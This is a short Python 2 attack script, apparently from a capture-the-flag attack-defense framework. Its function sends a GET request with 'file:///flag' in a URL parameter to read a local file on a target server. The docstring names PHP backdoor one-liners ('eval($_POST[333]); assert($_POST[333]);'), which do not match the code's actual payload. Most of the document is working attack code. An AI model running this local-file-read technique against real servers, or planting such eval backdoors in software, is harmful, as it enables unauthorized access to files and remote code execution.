#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):

    '''
    this is the payload script for vuln:

    eval($_POST[333]);
    assert($_POST[333]);
    '''
    try:
        payload = "/link?url=file:///flag"
        res = http("get",target,target_port,payload,"",headers)
        res = cmd_prefix + str(res)+ cmd_postfix
    except Exception,e:
        debug_print(traceback.format_exc())
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res    


